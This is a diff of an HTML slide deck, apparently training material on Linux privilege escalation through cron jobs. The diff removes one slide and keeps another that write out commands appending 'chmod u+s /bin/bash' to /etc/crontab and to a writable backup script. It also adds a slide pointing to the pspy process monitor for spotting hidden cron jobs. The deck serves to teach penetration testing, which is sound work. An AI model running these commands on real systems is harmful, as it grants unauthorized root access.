@@ -406,17 +406,6 @@
 					</section>
 
 					<section class="text-left">
-						<p>Writable crontabs</p>
-						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-4|4">
-							$ find /etc/cron* -perm /g=w,o=w 2>/dev/null
-							/etc/crontab
-
-							$ echo '* * * * * root chmod u+s /bin/bash' >> /etc/crontab
-						</code></pre>
-
-					</section>
-
-					<section class="text-left">
 						<p>Writable cron jobs scripts</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-4|1-2|4-5|7-8|10|12-14">
 							$ cat /etc/crontab  | grep -vE "^#"
@@ -429,7 +418,16 @@
 							user dialout cdrom floppy sudo audio dip video plugdev netdev lpadmin bluetooth scanner
 
 							$ echo 'chmod u+s /bin/bash' >> /var/www/backup.sh && sleep 60
-							</code></pre>
+						</code></pre>
+
+					</section>
+
+					<section class="text-left">
+						<p class="fragment">Hidden cronjobs</p>
+						<p class="fragment">Use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to catch it</p>
+						<p class="fragment">It monitors linux processes without root permissions</p>
+						
+						<img class="fragment" src="media/image/pspy.png">
 
 					</section>
 					
